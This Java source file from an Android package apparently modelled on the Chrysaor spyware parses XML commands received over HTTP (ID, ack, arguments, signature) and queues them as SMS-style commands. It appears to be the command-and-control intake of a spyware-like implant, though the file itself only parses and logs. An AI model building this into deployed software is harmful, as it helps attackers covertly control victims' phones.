package com.android.chrysaoralike;

import android.util.Log;
import org.xml.sax.Attributes;
import org.xml.sax.helpers.DefaultHandler;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.ByteArrayInputStream;
import java.util.ArrayList;
import java.util.List;

public class HttpCommandParser {
    private static final String TAG = "HttpCommandParser";
    private CommandQueue commandQueue = CommandQueue.getInstance();

    public void parse(String xml) {
        try {
            SAXParser parser = SAXParserFactory.newInstance().newSAXParser();
            XmlHandler handler = new XmlHandler();
            parser.parse(new ByteArrayInputStream(xml.getBytes("UTF-8")), handler);
            for (SmsCommand cmd : handler.getCommands()) {
                Log.i(TAG, "Enqueuing HTTP command: " + cmd.commandId);
                commandQueue.enqueue(cmd);
            }
        } catch (Exception e) { Log.e(TAG, "XML parse error", e); }
    }

    private class XmlHandler extends DefaultHandler {
        private List<SmsCommand> commands = new ArrayList<>();
        private StringBuilder currentElement = new StringBuilder();
        private String currentCmdId = "", currentAckId = "", currentArgs = "", currentSig = "";
        private boolean inCmd = false;

        public void startElement(String uri, String localName, String qName, Attributes atts) {
            currentElement.setLength(0);
            if (localName.equals("cmd")) inCmd = true;
        }
        public void characters(char[] ch, int start, int length) { currentElement.append(ch, start, length); }
        public void endElement(String uri, String localName, String qName) {
            String content = currentElement.toString().trim();
            if (localName.equals("cmd")) { currentCmdId = content; inCmd = false; }
            else if (localName.equals("a")) currentAckId = content;
            else if (localName.equals("arg")) currentArgs = content;
            else if (localName.equals("s")) currentSig = content;
            if (localName.equals("cmd") && !currentCmdId.isEmpty()) {
                try {
                    int cmdId = Integer.parseInt(currentCmdId);
                    int ackId = currentAckId.isEmpty() ? 0 : Integer.parseInt(currentAckId);
                    commands.add(new SmsCommand(cmdId, ackId, currentArgs, currentSig, "[HTTP]"));
                    Log.i(TAG, "Parsed HTTP command: " + commands.get(commands.size()-1));
                } catch (NumberFormatException e) { Log.w(TAG, "Invalid command ID: " + currentCmdId); }
                currentCmdId = ""; currentAckId = ""; currentArgs = ""; currentSig = "";
            }
        }
        public List<SmsCommand> getCommands() { return commands; }
    }
}